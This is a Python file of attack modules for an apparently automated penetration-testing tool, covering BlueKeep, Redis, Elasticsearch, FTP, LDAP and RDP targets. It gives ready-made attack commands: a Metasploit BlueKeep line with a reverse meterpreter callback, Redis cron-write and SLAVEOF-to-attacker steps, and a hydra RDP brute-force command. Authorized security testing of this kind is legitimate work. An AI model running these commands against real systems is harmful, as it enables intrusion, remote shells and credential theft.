"""Attack modules: services."""

from __future__ import annotations

from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext


class RDPBlueKeep(AttackModule):
    name = "RDPBlueKeep"
    description = "RDP use-after-free RCE (CVE-2019-0708)"
    target_services = ["ms-wbt-server", "rdp"]
    target_ports = [3389]
    required_cves = ["CVE-2019-0708"]
    # Phase 3: version-gated -- Win XP/7/Server 2003/2008/2008R2 only.
    target_versions = {
        "ms-wbt-server": ["windows xp", "2003", "windows 7", "2008", "2008 r2"],
        "rdp": ["5.1", "5.2", "6.0", "6.1"],
    }
    # Capability metadata: BlueKeep RCE -> shell (lands as SYSTEM).
    requires = []
    produces = ["shell"]
    read_only = False
    cost = "high"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "RDP use-after-free RCE (CVE-2019-0708). Affects unpatched "
                "Win XP/7/Server 2003/2008/2008R2. NLA-enabled RDP is NOT "
                "vulnerable. Lands as SYSTEM."
            ),
            evidence=[f"BlueKeep (CVE-2019-0708) applicable to {ctx.target_ip}"],
            references=[
                "https://nvd.nist.gov/vuln/detail/CVE-2019-0708",
                "https://www.rapid7.com/db/modules/exploit/windows/rdp/cve_2019_0708_bluekeep_rce/",
            ],
            suggested_msf=(
                f"exploit/windows/rdp/cve_2019_0708_bluekeep_rce RHOSTS={ctx.target_ip} "
                f"PAYLOAD=windows/x64/meterpreter/reverse_tcp LHOST=<op_callback> LPORT=4444"
            ),
            shell_type="meterpreter",
            privilege_level="system",
        )


# ---------------------------------------------------------------------------
# SSH Modules
# ---------------------------------------------------------------------------

class FTPAnonymous(AttackModule):
    name = "FTPAnonymous"
    description = "Test anonymous FTP login and enumerate files"
    target_services = ["ftp"]
    target_ports = [21]
    required_cves = []
    # Capability metadata: anonymous FTP enumeration (read-only probe).
    requires = []
    produces = ["credentials"]
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Attempts anonymous FTP login and lists accessible files. "
                "On success, credentials_found records the anonymous bind and "
                "downloaded files should be scanned for secrets (ArtifactExposure)."
            ),
            evidence=[f"anonymous FTP check against {ctx.target_ip}:21"],
            references=["https://owasp.org/www-community/attacks/Default_credentials"],
            suggested_command=f"python -c \"import ftplib; f=ftplib.FTP('{ctx.target_ip}'); f.login('anonymous','anonymous@'); print(f.nlst())\"",
            credentials_found=["anonymous:anonymous@"],
        )

class RedisExploit(AttackModule):
    name = "RedisExploit"
    description = "Exploit unauthenticated Redis for RCE or data extraction"
    target_services = ["redis"]
    target_ports = [6379]
    required_cves = []
    # Capability metadata: unauth Redis RCE -> foothold (SSH-key/cron write).
    requires = []
    produces = ["shell", "foothold"]
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Unauthenticated Redis: INFO probe, CONFIG GET dir, key "
                "enumeration via SCAN/GET, then RCE via cron/SSH-key write. "
                "SLAVEOF pivots to an attacker master -- that master must be "
                "in exploit.allowed_targets (target-IP lock)."
            ),
            evidence=[f"unauth Redis check against {ctx.target_ip}:6379"],
            references=[
                "https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html",
                "https://github.com/redis/redis",
            ],
            suggested_command=f"redis-cli -h {ctx.target_ip} INFO",
            exploit_paths=[
                "CONFIG SET dir /var/spool/cron",
                "CONFIG SET dbfilename root",
                "SLAVEOF attacker_ip 6379 (master must be allowlisted)",
            ],
            shell_type="reverse",
            privilege_level="root",
        )

class ElasticsearchExploit(AttackModule):
    name = "ElasticsearchExploit"
    description = "Extract data from exposed Elasticsearch clusters"
    target_services = ["elasticsearch"]
    target_ports = [9200]
    required_cves = []
    # Phase 3: unauth-by-default for <7.10; 7.10+ defaults to security on but
    # misconfigured deployments still expose.
    target_versions = {
        "elasticsearch": ["1.", "2.", "5.", "6.", "7.0", "7.1", "7.2", "7.3", "7.4", "7.5", "7.6", "7.7", "7.8", "7.9"],
    }
    # Capability metadata: exposed Elasticsearch data extraction (read-only enum).
    requires = []
    produces = ["credentials"]
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Enumerates indices, documents, and cluster configuration. "
                "Samples documents for secret-shaped keys (password/secret/"
                "api_key/token/aws_) and records hits in credentials_found."
            ),
            evidence=[f"Elasticsearch exposure check against {ctx.target_ip}:9200"],
            references=[
                "https://www.elastic.co/guide/en/elasticsearch/reference/current/security-minimal-setup.html",
                "https://book.hacktricks.wiki/en/network-services-pentesting/9200-pentesting-elasticsearch.html",
            ],
            suggested_command=f"curl -s http://{ctx.target_ip}:9200/_cat/indices?v",
        )

class LDAPAnonymous(AttackModule):
    name = "LDAPAnonymous"
    description = "Enumerate LDAP directory via anonymous bind"
    target_services = ["ldap", "ldaps"]
    target_ports = [389, 636, 3268]
    required_cves = []
    # Capability metadata: anonymous LDAP enumeration (read-only).
    requires = []
    produces = ["user_list"]
    read_only = True
    cost = "low"
    phase_hint = "enumerate"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Attempts anonymous LDAP bind and extracts directory structure. "
                "Auto-discover the base DN via RootDSE (defaultNamingContext) "
                "instead of guessing dc=example,dc=com. Prefer ADLDAPEnum which "
                "implements the stdlib BER/ASN.1 enumeration and captures "
                "sAMAccountName/servicePrincipalName/userAccountControl."
            ),
            evidence=[f"anonymous LDAP bind check against {ctx.target_ip}:389"],
            references=[
                "https://book.hacktricks.wiki/en/network-services-pentesting/389-pentesting-ldap.html",
                "https://ldapwiki.com/wiki/RootDSE",
            ],
            suggested_command=f"ldapsearch -x -H ldap://{ctx.target_ip} -b '' -s base '(objectClass=*)' defaultNamingContext",
        )

class RDPExploit(AttackModule):
    name = "RDPExploit"
    description = "RDP exploitation and credential testing"
    target_services = ["ms-wbt-server", "rdp"]
    target_ports = [3389]
    required_cves = []
    # Capability metadata: RDP credential testing -> foothold on success.
    requires = []
    produces = ["credentials", "foothold"]
    read_only = False
    cost = "medium"
    phase_hint = "exploit"

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Tests RDP for weak credentials and known vulnerabilities. "
                "hydra is Linux-attacker only; on Windows use crowbar or the "
                "generated Python script. users.txt/passwords.txt must be "
                "written via write_python_file first."
            ),
            evidence=[f"RDP credential test against {ctx.target_ip}:3389"],
            references=["https://book.hacktricks.wiki/en/network-services-pentesting/3389-pentesting-rdp.html"],
            suggested_command=f"hydra -t 1 -V -f -L users.txt -P passwords.txt rdp://{ctx.target_ip}",
        )


# ---------------------------------------------------------------------------
# Advanced Web Exploitation Modules
# ---------------------------------------------------------------------------

